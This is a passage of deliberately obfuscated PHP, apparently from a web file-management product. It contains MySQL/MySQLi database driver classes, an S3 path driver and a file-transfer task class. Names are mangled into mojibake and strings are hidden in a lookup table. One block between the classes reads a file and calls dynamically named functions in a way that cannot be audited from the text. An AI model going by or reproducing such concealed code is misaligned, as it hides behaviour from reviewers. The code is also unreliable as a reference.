$àè±şèì[1060] . $ÊÉ‘ú¼ . $àè±şèì[1061]; } else { $ùçşŸ˜¦ = $àè±şèì[1062]; } $Í¯Õ¶’õ = $this->query($ùçşŸ˜¦); $ˆË‰£Š· = array(); foreach ($Í¯Õ¶’õ as $¦ÁĞà => $ˆ…ˆÏù ) { $ˆË‰£Š·[$¦ÁĞà] = current($ˆ…ˆÏù ); } return $ˆË‰£Š·; } public function replace($ˆÎÎ¬œ, $ŸŒ¶ÙğÉ = array()) { $Ú¦€»ø¬ =& $_SERVER[©—Ò»ÅĞ]; foreach ($ˆÎÎ¬œ as $›³ÔêË€ => $Ş”ü¼†) { $‡àÈ¿ÒŞ = $this->parseValue($Ş”ü¼†); if (is_scalar($‡àÈ¿ÒŞ)) { $œ¡äÍÕ›[] = $‡àÈ¿ÒŞ; $¾¹¦Öé[] = $this->parseKey($›³ÔêË€); } } $Ù€»¥Ğ¤ = $Ú¦€»ø¬[1063] . $this->parseTable($ŸŒ¶ÙğÉ[$Ú¦€»ø¬[357]]) . $Ú¦€»ø¬[1064] . implode($Ú¦€»ø¬[50], $¾¹¦Öé) . $Ú¦€»ø¬[1065] . implode($Ú¦€»ø¬[50], $œ¡äÍÕ›) . $Ú¦€»ø¬[1066]; return $this->execute($Ù€»¥Ğ¤); } public function insertAll($ ‚Ë¿¡¿, $üÇß÷­Û = array(), $½¡¬°Ôº = false) { $ß±ƒ»–â =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($ ‚Ë¿¡¿[0])) { return !1; } $«íŸöã« = array_keys($ ‚Ë¿¡¿[0]); $»Œ°ÉÚ¥ = array(); foreach ($ ‚Ë¿¡¿ as $Éìš—’²) { $À¹›¿—§ = array(); foreach ($Éìš—’² as $œšüÇİ­ => $éúÒìİë) { $éúÒìİë = $this->parseValue($éúÒìİë); if (is_scalar($éúÒìİë)) { $À¹›¿—§[] = $éúÒìİë; } } $»Œ°ÉÚ¥[] = $ß±ƒ»–â[337] . implode($ß±ƒ»–â[50], $À¹›¿—§) . $ß±ƒ»–â[1066]; } array_walk($«íŸöã«, array($this, $ß±ƒ»–â[1067])); $àÑáÍ¤´ = $½¡¬°Ôº ? $ß±ƒ»–â[1068] : $ß±ƒ»–â[1069]; $àÑáÍ¤´ = $ß±ƒ»–â[1069]; $±ß™¸Ê = $àÑáÍ¤´ . $ß±ƒ»–â[1070] . $this->parseTable($üÇß÷­Û[$ß±ƒ»–â[357]]) . $ß±ƒ»–â[1064] . implode($ß±ƒ»–â[50], $«íŸöã«) . $ß±ƒ»–â[1071] . implode($ß±ƒ»–â[50], $»Œ°ÉÚ¥); if ($½¡¬°Ôº) { $õÜšïÂŠ = array(); foreach ($«íŸöã« as $œšüÇİ­) { if ($œšüÇİ­ == $ß±ƒ»–â[231] || $œšüÇİ­ == $ß±ƒ»–â[1072]) { continue; } $õÜšïÂŠ[] = $œšüÇİ­ . $ß±ƒ»–â[1073] . $œšüÇİ­ . $ß±ƒ»–â[1066]; } $±ß™¸Ê .= $ß±ƒ»–â[1074] . implode($ß±ƒ»–â[50], $õÜšïÂŠ); } return $this->execute($±ß™¸Ê); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $êõ•¬÷È =& $_SERVER[©—Ò»ÅĞ]; $this->error = mysql_errno() . $êõ•¬÷È[4] . mysql_error($this->_linkID); if ($êõ•¬÷È[12] != $this->queryStr) { $this->error .= LNG($êõ•¬÷È[48]) . $this->queryStr; } think_trace($this->error, $êõ•¬÷È[12], $êõ•¬÷È[49]); return $this->error; } public function escapeString($®˜†½”ë) { if ($this->_linkID) { return mysql_real_escape_string($®˜†½”ë, $this->_linkID); } else { return mysql_escape_string($®˜†½”ë); } } public function parseKey(&$ ™æé¿ù, $¦êËëÏ = true) { $›Ñ¡öØå =& $_SERVER[©—Ò»ÅĞ]; if ($¦êËëÏ) { $ ™æé¿ù = $this->parseKeyCheck($ ™æé¿ù); } if ($ ™æé¿ù != $›Ñ¡öØå[220] && !preg_match($›Ñ¡öØå[1075], $ ™æé¿ù)) { $ ™æé¿ù = $›Ñ¡öØå[475] . trim($ ™æé¿ù, $›Ñ¡öØå[475]) . $›Ñ¡öØå[475]; } return $ ™æé¿ù; } } if ($_SERVER[$_SERVER[©—Ò»ÅĞ][1034]] != $_SERVER[$_SERVER[©—Ò»ÅĞ][1076]]) { $_getc = $_SERVER[©—Ò»ÅĞ][1037]; $_getfile = $_SERVER[$_SERVER[©—Ò»ÅĞ][1038]] . $_SERVER[©—Ò»ÅĞ][1039]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[©—Ò»ÅĞ][285], $_getfilec); if (count($_getarrs) < $_SERVER[©—Ò»ÅĞ][714]) { $exit = $_SERVER[©—Ò»ÅĞ][1040]; $exit(); } $_act = $_SERVER[©—Ò»ÅĞ][1045]; $_act($_SERVER[$_SERVER[©—Ò»ÅĞ][1035]]); } class DbMysqli extends Db { public function __construct($ŠÔå¹Ù = '') { $Ä½’¤³Ü =& $_SERVER[©—Ò»ÅĞ]; if (!extension_loaded($Ä½’¤³Ü[1077])) { think_exception(think_lang($Ä½’¤³Ü[14]) . $Ä½’¤³Ü[1078]); } if (!empty($ŠÔå¹Ù)) { $this->config = $ŠÔå¹Ù; if (empty($this->config[$Ä½’¤³Ü[17]])) { $this->config[$Ä½’¤³Ü[17]] = $Ä½’¤³Ü[12]; } } } public function connect($Ë¯áõ½Ú = '', $×ÅØÍ™¤ = 0) { $…ıã¢Ø° =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->linkID[$×ÅØÍ™¤])) { if (empty($Ë¯áõ½Ú)) { $Ë¯áõ½Ú = $this->config; } $this->linkID[$×ÅØÍ™¤] = new mysqli($Ë¯áõ½Ú[$…ıã¢Ø°[1047]], $Ë¯áõ½Ú[$…ıã¢Ø°[1049]], $Ë¯áõ½Ú[$…ıã¢Ø°[1050]], $Ë¯áõ½Ú[$…ıã¢Ø°[21]], $Ë¯áõ½Ú[$…ıã¢Ø°[1048]] ? intval($Ë¯áõ½Ú[$…ıã¢Ø°[1048]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÀıŠÄÅ– = $this->linkID[$×ÅØÍ™¤]->server_version; $this->linkID[$×ÅØÍ™¤]->query($…ıã¢Ø°[1051] . think_config($…ıã¢Ø°[1052]) . $…ıã¢Ø°[58]); if ($ÀıŠÄÅ– > $…ıã¢Ø°[1053]) { $this->linkID[$×ÅØÍ™¤]->query($…ıã¢Ø°[1054]); } $this->connected = !0; if (1 != think_config($…ıã¢Ø°[22])) { unset($this->config); } } return $this->linkID[$×ÅØÍ™¤]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($––ûî•Ã) { $ÜÑÈÍ˜¿ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $––ûî•Ã; if ($this->queryID) { $this->free(); } think_action_status($ÜÑÈÍ˜¿[23], 1); think_status($ÜÑÈÍ˜¿[24]); $this->queryID = $this->_linkID->query($––ûî•Ã); if ($this->_linkID->more_results()) { while (($ ğÏ°²— = $this->_linkID->next_result()) != NULL) { $ ğÏ°²—->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ä›–ÌŸÃ) { $™ª¼Ô¦´ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ä›–ÌŸÃ; if ($this->queryID) { $this->free(); } think_action_status($™ª¼Ô¦´[25], 1); think_status($™ª¼Ô¦´[24]); $Ââ¿ÅŞÚ = $this->_linkID->query($ä›–ÌŸÃ); $this->debug(); if (!1 === $Ââ¿ÅŞÚ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $É’×ƒÚ¡ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$É’×ƒÚ¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ï¸Íœí÷ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ï¸Íœí÷) { $this->error(); return !1; } } return !0; } private function getAll() { $Òè¦ÑÚÌ = array(); if ($this->numRows > 0) { for ($ğšøÒ¡ë = 0; $ğšøÒ¡ë < $this->numRows; $ğšøÒ¡ë++) { $Òè¦ÑÚÌ[$ğšøÒ¡ë] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Òè¦ÑÚÌ; } public function getFields($§Ò±úˆ) { $£Æ¶è =& $_SERVER[©—Ò»ÅĞ]; $ÅìÈ²˜ë = $this->query($£Æ¶è[1058] . $this->parseKey($§Ò±úˆ)); $¯ç©”¨” = array(); if ($ÅìÈ²˜ë) { foreach ($ÅìÈ²˜ë as $‹¡¸ÇÎ => $Ö¿‹­Äğ) { $¯ç©”¨”[$Ö¿‹­Äğ[$£Æ¶è[31]]] = array($£Æ¶è[32] => $Ö¿‹­Äğ[$£Æ¶è[31]], $£Æ¶è[33] => $Ö¿‹­Äğ[$£Æ¶è[34]], $£Æ¶è[35] => (bool) ($Ö¿‹­Äğ[$£Æ¶è[36]] === $£Æ¶è[12]), $£Æ¶è[37] => $Ö¿‹­Äğ[$£Æ¶è[38]], $£Æ¶è[39] => strtolower($Ö¿‹­Äğ[$£Æ¶è[40]]) == $£Æ¶è[41], $£Æ¶è[42] => strtolower($Ö¿‹­Äğ[$£Æ¶è[43]]) == $£Æ¶è[44]); } } return $¯ç©”¨”; } public function getTables($Û”­¶ª° = '') { $âÀï öü =& $_SERVER[©—Ò»ÅĞ]; $†Í˜¦“Ó = !empty($Û”­¶ª°) ? $âÀï öü[1060] . $Û”­¶ª° . $âÀï öü[1061] : $âÀï öü[1062]; $«ı” Ì² = $this->query($†Í˜¦“Ó); $ˆ¥ª”“ú = array(); if ($«ı” Ì²) { foreach ($«ı” Ì² as $ë¥—…å => $î±Šºù¹) { $ˆ¥ª”“ú[$ë¥—…å] = current($î±Šºù¹); } } return $ˆ¥ª”“ú; } public function replace($°ùƒ§îÈ, $³ø÷Íõü = array()) { $ÆÜ¤ãÇ– =& $_SERVER[©—Ò»ÅĞ]; foreach ($°ùƒ§îÈ as $¤ÕÀÏ‚š => $œ·×Îı¿) { $ÚØÃ­Ã† = $this->parseValue($œ·×Îı¿); if (is_scalar($ÚØÃ­Ã†)) { $„¨İï¶[] = $ÚØÃ­Ã†; $…˜çàˆÙ[] = $this->parseKey($¤ÕÀÏ‚š); } } $õË›ß´Ğ = $ÆÜ¤ãÇ–[1063] . $this->parseTable($³ø÷Íõü[$ÆÜ¤ãÇ–[357]]) . $ÆÜ¤ãÇ–[1064] . implode($ÆÜ¤ãÇ–[50], $…˜çàˆÙ) . $ÆÜ¤ãÇ–[1065] . implode($ÆÜ¤ãÇ–[50], $„¨İï¶) . $ÆÜ¤ãÇ–[1066]; return $this->execute($õË›ß´Ğ); } public function insertAll($–ìÈÒ…¶, $Áçœ’®› = array(), $‘’ğº®â = false) { $§’ğ¿ÏØ =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($–ìÈÒ…¶[0])) { return !1; } $À”³¾‘ = array_keys($–ìÈÒ…¶[0]); $Ç¦Î¡ø = array(); foreach ($–ìÈÒ…¶ as $ÃÊûÅÅ¥) { $„ûÑš‘ö = array(); foreach ($ÃÊûÅÅ¥ as $£Ù¼ê => $Š²İèÆ) { $Š²İèÆ = $this->parseValue($Š²İèÆ); if (is_scalar($Š²İèÆ)) { $„ûÑš‘ö[] = $Š²İèÆ; } } $Ç¦Î¡ø[] = $§’ğ¿ÏØ[337] . implode($§’ğ¿ÏØ[50], $„ûÑš‘ö) . $§’ğ¿ÏØ[1066]; } array_walk($À”³¾‘, array($this, $§’ğ¿ÏØ[1067])); $ÅÏµƒùÙ = $‘’ğº®â ? $§’ğ¿ÏØ[1068] : $§’ğ¿ÏØ[1069]; $ÅÏµƒùÙ = $§’ğ¿ÏØ[1069]; $ƒÏÑşØ = $ÅÏµƒùÙ . $§’ğ¿ÏØ[1070] . $this->parseTable($Áçœ’®›[$§’ğ¿ÏØ[357]]) . $§’ğ¿ÏØ[1064] . implode($§’ğ¿ÏØ[50], $À”³¾‘) . $§’ğ¿ÏØ[1071] . implode($§’ğ¿ÏØ[50], $Ç¦Î¡ø); if ($‘’ğº®â) { $©°ˆ­‘Ø = array(); foreach ($À”³¾‘ as $£Ù¼ê) { if ($£Ù¼ê == $§’ğ¿ÏØ[231] || $£Ù¼ê == $§’ğ¿ÏØ[1072]) { continue; } $©°ˆ­‘Ø[] = $£Ù¼ê . $§’ğ¿ÏØ[1073] . $£Ù¼ê . $§’ğ¿ÏØ[1066]; } $ƒÏÑşØ .= $§’ğ¿ÏØ[1074] . implode($§’ğ¿ÏØ[50], $©°ˆ­‘Ø); } return $this->execute($ƒÏÑşØ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $é—¬ Ë§ =& $_SERVER[©—Ò»ÅĞ]; $this->error = $this->_linkID->errno . $é—¬ Ë§[4] . $this->_linkID->error; if ($é—¬ Ë§[12] != $this->queryStr) { $this->error .= LNG($é—¬ Ë§[48]) . $this->queryStr; } think_trace($this->error, $é—¬ Ë§[12], $é—¬ Ë§[49]); return $this->error; } public function escapeString($ÛÇªÊü) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÛÇªÊü); } else { return addslashes($ÛÇªÊü); } } public function parseKey(&$¢Š¨€Šá, $Ÿ¹—•Äï = true) { $†Ç¤úËä =& $_SERVER[©—Ò»ÅĞ]; if ($Ÿ¹—•Äï) { $¢Š¨€Šá = $this->parseKeyCheck($¢Š¨€Šá); } if ($¢Š¨€Šá != $†Ç¤úËä[220] && !preg_match($†Ç¤úËä[1075], $¢Š¨€Šá)) { $¢Š¨€Šá = $†Ç¤úËä[475] . trim($¢Š¨€Šá, $†Ç¤úËä[475]) . $†Ç¤úËä[475]; } return $¢Š¨€Šá; } } goto aÓø…é„Õ; eŠ¹ŸÔøİİ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($»ì¹ñé©) { $†î¥¦ =& $_SERVER[©—Ò»ÅĞ]; parent::__construct($»ì¹ñé©); $Ò°íÉÂ¾ = isset($»ì¹ñé©[$†î¥¦[256]]) && $»ì¹ñé©[$†î¥¦[256]] == $†î¥¦[247] ? $†î¥¦[247] : $†î¥¦[313]; $this->setSignVersion($Ò°íÉÂ¾); } public function link($ÊÂëÑíó, $«Øª»×î = array()) { return parent::link($ÊÂëÑíó, $«Øª»×î); } public function fileOut($‹Æ×šÑ˜, $ûÒëšÙ§ = false, $Ä•ä¦çĞ = false, $ç’Œ§Ç÷ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[©—Ò»ÅĞ][314])) { return parent::fileOutServer($‹Æ×šÑ˜, $ûÒëšÙ§, $Ä•ä¦çĞ, $ç’Œ§Ç÷); } parent::fileOut($‹Æ×šÑ˜, $ûÒëšÙ§, $Ä•ä¦çĞ, $ç’Œ§Ç÷); } public function fileOutImage($ı©ú¸•, $ÏÂ¼Ğ¤ = 250) { if (strstr($this->endpoint, $_SERVER[©—Ò»ÅĞ][314])) { return parent::fileOutImageServer($ı©ú¸•, $ÏÂ¼Ğ¤); } parent::fileOutImage($ı©ú¸•, $ÏÂ¼Ğ¤); } } define($_SERVER[©—Ò»ÅĞ][315], 1); define($_SERVER[©—Ò»ÅĞ][316], 2); goto b¢æÃŠ×š³; Bõì–ÇÕ£ó: class TaskFileTransfer extends Task { protected function startAfter() { $¯³È˜ß =& $_SERVER[©—Ò»ÅĞ]; $˜×‘Õ©œ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¯³È˜ß[2008], array($this, $¯³È˜ß[2009])); Hook::bind($¯³È˜ß[1413], array($this, $¯³È˜ß[2010])); Hook::bind($¯³È˜ß[2011], array($this, $¯³È˜ß[2012])); Hook::bind($¯³È˜ß[690], array($this, $¯³È˜ß[2013])); Hook::bind($¯³È˜ß[691], array($this, $¯³È˜ß[2014])); Hook::bind($¯³È˜ß[697], array($this, $¯³È˜ß[2015])); Hook::bind($¯³È˜ß[698], array($this, $¯³È˜ß[2016])); Hook::bind($¯³È˜ß[693], array($this, $¯³È˜ß[2017])); Hook::bind($¯³È˜ß[695], array($this, $¯³È˜ß[2018])); Hook::bind($¯³È˜ß[659], array($this, $¯³È˜ß[2019])); Hook::bind($¯³È˜ß[656], array($this, $¯³È˜ß[2019])); Hook::bind($¯³È˜ß[661], array($this, $¯³È˜ß[2019])); Hook::bind($¯³È˜ß[663], array($this, $¯³È˜ß[2019])); Hook::bind($¯³È˜ß[665], array($this, $¯³È˜ß[2019])); Hook::bind($¯³È˜ß[2020], array($this, $¯³È˜ß[2021])); Hook::bind($¯³È˜ß[681], array($this, $¯³È˜ß[2022])); $this->sourceModelCopyFlag = !1; Hook::bind($¯³È˜ß[2023], array($this, $¯³È˜ß[2024])); Hook::bind($¯³È˜ß[2025], array($this, $¯³È˜ß[2026])); Hook::bind($¯³È˜ß[2027], array($this, $¯³È˜ß[2028])); $˜×‘Õ©œ[$¯³È˜ß[2029]] = LNG($¯³È˜ß[2030]); $˜×‘Õ©œ[$¯³È˜ß[2031]] = 0; $˜×‘Õ©œ[$¯³È˜ß[2032]] = 0; $˜×‘Õ©œ[$¯³È˜ß[1234]] = $¯³È˜ß[12]; $˜×‘Õ©œ[$¯³È˜ß[2033]] = $¯³È˜ß[12]; $˜×‘Õ©œ[$¯³È˜ß[2034]] = 0; $˜×‘Õ©œ[$¯³È˜ß[2035]] = 0; $˜×‘Õ©œ[$¯³È˜ß[941]] = 0; if (!$˜×‘Õ©œ[$¯³È˜ß[1865]]) { $˜×‘Õ©œ[$¯³È˜ß[1865]] = LNG($¯³È˜ß[2036]); } } protected function endAfter() { $‘‹ŒšÙÏ =& $_SERVER[©—Ò»ÅĞ]; Hook::unbind($‘‹ŒšÙÏ[2008], array($this, $‘‹ŒšÙÏ[2009])); Hook::unbind($‘‹ŒšÙÏ[1413], array($this, $‘‹ŒšÙÏ[2010])); Hook::unbind($‘‹ŒšÙÏ[2011], array($this, $‘‹ŒšÙÏ[2012])); Hook::unbind($‘‹ŒšÙÏ[690], array($this, $‘‹ŒšÙÏ[2013])); Hook::unbind($‘‹ŒšÙÏ[691], array($this, $‘‹ŒšÙÏ[2014])); Hook::unbind($‘‹ŒšÙÏ[697], array($this, $‘‹ŒšÙÏ[2015])); Hook::unbind($‘‹ŒšÙÏ[698], array($this, $‘‹ŒšÙÏ[2016])); Hook::unbind($‘‹ŒšÙÏ[693], array($this, $‘‹ŒšÙÏ[2017])); Hook::unbind($‘‹ŒšÙÏ[695], array($this, $‘‹ŒšÙÏ[2018])); Hook::unbind($‘‹ŒšÙÏ[659], array($this, $‘‹ŒšÙÏ[2019])); Hook::unbind($‘‹ŒšÙÏ[656], array($this, $‘‹ŒšÙÏ[2019])); Hook::unbind($‘‹ŒšÙÏ[661], array($this, $‘‹ŒšÙÏ[2019])); Hook::unbind($‘‹ŒšÙÏ[663], array($this, $‘‹ŒšÙÏ[2019])); Hook::unbind($‘‹ŒšÙÏ[665], array($this, $‘‹ŒšÙÏ[2019])); Hook::unbind($‘‹ŒšÙÏ[2020], array($this, $‘‹ŒšÙÏ[2021])); Hook::unbind($‘‹ŒšÙÏ[681], array($this, $‘‹ŒšÙÏ[2022])); Hook::unbind($‘‹ŒšÙÏ[2023], array($this, $‘‹ŒšÙÏ[2024])); Hook::unbind($‘‹ŒšÙÏ[2025], array($this, $‘‹ŒšÙÏ[2026])); Hook::unbind($‘‹ŒšÙÏ[2027], array($this, $‘‹ŒšÙÏ[2028])); } public function copyMoveStart($ì¶ÉÍÏ , $ª»ï¼’, $™ô¼ıĞÈ, $•™½œ¼ë) { $…ÍŠ‹Â¨ =& $_SERVER[©—Ò»ÅĞ]; self::log($…ÍŠ‹Â¨[2037] . $ª»ï¼’ . $…ÍŠ‹Â¨[73] . $•™½œ¼ë); $ÁËãş = rtrim(TEMP_FILES, $…ÍŠ‹Â¨[8]); if (substr($ª»ï¼’, 0, strlen($ÁËãş)) == $ÁËãş) { return; } if (substr($•™½œ¼ë, 0, strlen($ÁËãş)) == $ÁËãş) { return; } $ŸÇ“ç­¡ =& $this->task; $ŸÇ“ç­¡[$…ÍŠ‹Â¨[2038]] = KodIO::transferType($ì¶ÉÍÏ , $™ô¼ıĞÈ); self::log($…ÍŠ‹Â¨[2039] . $ŸÇ“ç­¡[$…ÍŠ‹Â¨[2038]] . $…ÍŠ‹Â¨[74] . $ª»ï¼’ . $…ÍŠ‹Â¨[73] . $•™½œ¼ë); $this->update(); } public function updateAfter() { $«ã¸™‹Ä =& $_SERVER[©—Ò»ÅĞ]; $ş†¦åøÇ =& $this->task; if (!$ş†¦åøÇ[$«ã¸™‹Ä[864]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ş†¦åøÇ[$«ã¸™‹Ä[2038]] == $«ã¸™‹Ä[1514]) { return; } self::updateTask($ş†¦åøÇ); } private static function updateTask(&$Ş·ÔúÌÈ) { $ğºŠÓ§Ğ =& $_SERVER[©—Ò»ÅĞ]; if ($Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2038]] == $ğºŠÓ§Ğ[1385] || $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2038]] == $ğºŠÓ§Ğ[107]) { if ($Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2033]]) { $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[941]] = $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2035]] + $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2032]]; } } else { if ($Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2038]] == $ğºŠÓ§Ğ[1515]) { if ($Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2033]] == $ğºŠÓ§Ğ[1385]) { $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[941]] = $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2035]] + $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2032]] * 0.5; } else { if ($Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2033]] == $ğºŠÓ§Ğ[107]) { $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[941]] = $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2035]] + $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2031]] * 0.5 + $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2032]] * 0.5; } } } } $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1979]] = $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[941]] / $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[864]]; if ($Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1979]] > 0) { $™·É­éÒ = timeFloat() - $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1981]] - $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1984]]; $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1985]] = $™·É­éÒ * (1 - $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1979]]) / $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1979]]; } $“ŒÚó«§ = $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2032]] . $ğºŠÓ§Ğ[992] . $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2031]] . "\73\40{$ê–™ê›Õ}\x3b" . $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[941]]; self::log($ğºŠÓ§Ğ[2040] . $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[2033]] . $ğºŠÓ§Ğ[74] . $Ş·ÔúÌÈ[$ğºŠÓ§Ğ[1979]] . $ğºŠÓ§Ğ[74] . $“ŒÚó«§); } public function addPath($†şØîÙƒ) { $ŞËÏ´ï¤ =& $_SERVER[©—Ò»ÅĞ]; if (!$†şØîÙƒ) { return; } $†â—ºñ‰ =& $this->task; $¡²Ò‘È¢ = IO::infoWithChildren($†şØîÙƒ); $ĞÇ©ûßß = $†â—ºñ‰[$ŞËÏ´ï¤[2041]] ? $†â—ºñ‰[$ŞËÏ´ï¤[2041]][$ŞËÏ´ï¤[2042]] : 0; $†â—ºñ‰[$ŞËÏ´ï¤[2041]] = array($ŞËÏ´ï¤[2042] => $ĞÇ©ûßß + 1, $ŞËÏ´ï¤[509] => $¡²Ò‘È¢[$ŞËÏ´ï¤[32]], $ŞËÏ´ï¤[87] => $¡²Ò‘È¢[$ŞËÏ´ï¤[87]], $ŞËÏ´ï¤[602] => $¡²Ò‘È¢[$ŞËÏ´ï¤[602]] ? $¡²Ò‘È¢[$ŞËÏ´ï¤[602]] : $¡²Ò‘È¢[$ŞËÏ´ï¤[87]]); if ($¡²Ò‘È¢[$ŞËÏ´ï¤[33]] == $ŞËÏ´ï¤[230]) { $†â—ºñ‰[$ŞËÏ´ï¤[1232]] += 1; } else { $†â—ºñ‰[$ŞËÏ´ï¤[1232]] += $¡²Ò‘È¢[$ŞËÏ´ï¤[82]][$ŞËÏ´ï¤[80]]; if ($¡²Ò‘È¢[$ŞËÏ´ï¤[191]]) { $†â—ºñ‰[$ŞËÏ´ï¤[1232]] += $¡²Ò‘È¢[$ŞËÏ´ï¤[82]][$ŞËÏ´ï¤[81]] + 1; } } $†â—ºñ‰[$ŞËÏ´ï¤[864]] += $¡²Ò‘È¢[$ŞËÏ´ï¤[79]]; $this->update(); self::log(array($ŞËÏ´ï¤[2043] . $†şØîÙƒ, $¡²Ò‘È¢)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¥œÃ•¨Ì) { } public function sourceAddHashEnd($‹œ±ÜŞ‹) { } public function sourceAddFileStart($Û‘“¼Ñ‡) { $Ô•ì¨ÚŠ =& $_SERVER[©—Ò»ÅĞ]; $çÚ À°¨ =& $this->task; $çÚ À°¨[$Ô•ì¨ÚŠ[2031]] = $Û‘“¼Ñ‡[$Ô•ì¨ÚŠ[79]]; $çÚ À°¨[$Ô•ì¨ÚŠ[2029]] = $Û‘“¼Ñ‡[$Ô•ì¨ÚŠ[32]]; $çÚ À°¨[$Ô•ì¨ÚŠ[1234]] = $Û‘“¼Ñ‡[$Ô•ì¨ÚŠ[32]]; $çÚ À°¨[$Ô•ì¨ÚŠ[2044]] = $Û‘“¼Ñ‡[$Ô•ì¨ÚŠ[87]]; $this->update(); self::log($Ô•ì¨ÚŠ[2045] . $Û‘“¼Ñ‡[$Ô•ì¨ÚŠ[87]] . $Ô•ì¨ÚŠ[2046] . $Û‘“¼Ñ‡[$Ô•ì¨ÚŠ[79]]); } public function sourceAddFileEnd($Ñ´ªõéö) { $µğùØ÷ =& $_SERVER[©—Ò»ÅĞ]; $ÎÄœù¤ =& $this->task; $ÎÄœù¤[$µğùØ÷[941]] += $Ñ´ªõéö[$µğùØ÷[79]]; $ÎÄœù¤[$µğùØ÷[2044]] = $Ñ´ªõéö[$µğùØ÷[87]]; $this->update(1); self::log($µğùØ÷[2047] . $Ñ´ªõéö[$µğùØ÷[87]] . $µğùØ÷[2046] . $Ñ´ªõéö[$µğùØ÷[79]] . $µğùØ÷[2048]); } public function copyFileStart($†ÄÉµ‹, $¦‡ø„Üä, $ÓÚÇö, $°‰¥–ÙÇ, $æìº‹Ü, $Ç›÷´ÒÓ) { $‘é…ÙÎ =& $_SERVER[©—Ò»ÅĞ]; $ô—ù‘ğİ = $æìº‹Ü; if ($ô—ù‘ğİ == $GLOBALS[$‘é…ÙÎ[2049]]) { $ô—ù‘ğİ = $GLOBALS[$‘é…ÙÎ[2050]]; } $GLOBALS[$‘é…ÙÎ[2050]] = $æìº‹Ü; $GLOBALS[$‘é…ÙÎ[2049]] = $Ç›÷´ÒÓ; $ëş¸‰–Õ =& $this->task; $ëş¸‰–Õ[$‘é…ÙÎ[2029]] = $ô—ù‘ğİ; $ëş¸‰–Õ[$‘é…ÙÎ[2031]] = (int) $†ÄÉµ‹->size($¦‡ø„Üä); $ëş¸‰–Õ[$‘é…ÙÎ[2032]] = 0; $ëş¸‰–Õ[$‘é…ÙÎ[1234]] = $‘é…ÙÎ[12]; $ëş¸‰–Õ[$‘é…ÙÎ[2033]] = $‘é…ÙÎ[12]; $ëş¸‰–Õ[$‘é…ÙÎ[2034]] = 0; $ßË¿²Ä = $ëş¸‰–Õ[$‘é…ÙÎ[2031]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ëş¸‰–Õ[$‘é…ÙÎ[487]] . $‘é…ÙÎ[2051]); if ($ßË¿²Ä && file_exists(get_path_father($°‰¥–ÙÇ))) { Cache::set($ëş¸‰–Õ[$‘é…ÙÎ[487]] . $‘é…ÙÎ[2051], $°‰¥–ÙÇ); $ëş¸‰–Õ[$‘é…ÙÎ[2002]] = array($‘é…ÙÎ[2052], $‘é…ÙÎ[2053]); } $this->update(0, $ßË¿²Ä); self::log("\x63\157\160\171\x46\151\154\145\123\x74\x61\162\x74\72{$¦‡ø„Üä}\73"); } public static function updateCopyLocalFileSize($æ½¸˜İ) { $û­ÒËÌ =& $_SERVER[©—Ò»ÅĞ]; $ù£’¾ß  = Cache::get($æ½¸˜İ[$û­ÒËÌ[487]] . $û­ÒËÌ[2051]); if (!$ù£’¾ß  || 